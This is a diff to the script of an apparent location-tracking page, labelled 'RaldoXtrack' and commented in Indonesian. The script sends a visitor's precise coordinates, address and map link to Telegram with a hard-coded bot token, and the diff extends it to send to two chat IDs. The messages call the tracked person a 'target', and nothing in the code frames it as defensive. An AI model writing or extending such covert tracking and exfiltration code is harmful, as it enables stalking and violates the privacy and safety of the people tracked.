@@ -24,7 +24,7 @@
     <script>
         // Ganti ini
         const BOT_TOKEN = '7822471568:AAE89BHf7mxBx4kqhKNLyE7yP4IlMgi8wFE';
-        const CHAT_ID = '7680606818';
+        const CHAT_IDS = ['7680606818', '6212362026']; // Masukin dua ID di sini, misal ['7680606818', 'ID_KEDUA_LO']
         
         let watchId;
         let lastLat = null;
@@ -58,20 +58,23 @@
             }
         }
 
-        // Kirim ke Telegram (sama)
+        // Kirim ke Telegram - Update buat multiple ID
         async function sendToTelegram(lat, lng, accuracy, timestamp, address, mapsLink) {
-            const message = `😈𝙍𝙖𝙡𝙙𝙤𝙓𝙩𝙧𝙖𝙘𝙠: 𝙨𝙪𝙠𝙨𝙚𝙨 𝙏𝙖𝙧𝙜𝙚𝙩 𝘽𝙚𝙧𝙝𝙖𝙨𝙞𝙡 𝘿𝙞 𝙇𝙖𝙘𝙖𝙠!😈\n\nLatitude: ${lat.toFixed(7)}\nLongitude: ${lng.toFixed(7)}\nAkurasi: ${accuracy}m\nAlamat: ${address}\nWaktu: ${new Date(timestamp).toLocaleString('id-ID')}\n\n😈𝐋𝐨𝐤𝐚𝐬𝐢 𝐓𝐚𝐫𝐠𝐞😈𝐭: ${mapsLink}`;
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
+            const message = `😈𝙍𝙖𝙡𝙙𝙤𝙓𝙩𝙧𝙖𝙘𝙠: 𝙨𝙪𝙠𝙨𝙚𝙨 𝙏𝙖𝙧𝙜𝙚𝙩 𝘽𝙚𝙧𝙝𝙖𝙨𝙞𝙡 𝘿𝙞 𝙇𝙖𝙘𝙖𝙠!😈\n\nLatitude: ${lat.toFixed(7)}\nLongitude: ${lng.toFixed(7)}\nAkurasi: ${accuracy}m\nAlamat: ${address}\nWaktu: ${new Date(timestamp).toLocaleString('id-ID')}\n\n😈𝐋𝐨𝐤𝐚𝐬𝐢 𝐓𝐚𝐫𝐠𝐞𝐭: ${mapsLink}`;
             
-            try {
-                const response = await fetch(url);
-                if (response.ok) {
-                    console.log('Data terkirim!');
-                } else {
-                    console.error('Error kirim:', response.status);
+            // Loop buat kirim ke semua ID
+            for (const chatId of CHAT_IDS) {
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
+                try {
+                    const response = await fetch(url);
+                    if (response.ok) {
+                        console.log(`Data terkirim ke chat ${chatId}!`);
+                    } else {
+                        console.error(`Error kirim ke ${chatId}: ${response.status}`);
+                    }
+                } catch (error) {
+                    console.error(`Error fetch ke ${chatId}: ${error.message}`);
                 }
-            } catch (error) {
-                console.error('Error:', error);
             }
         }
 
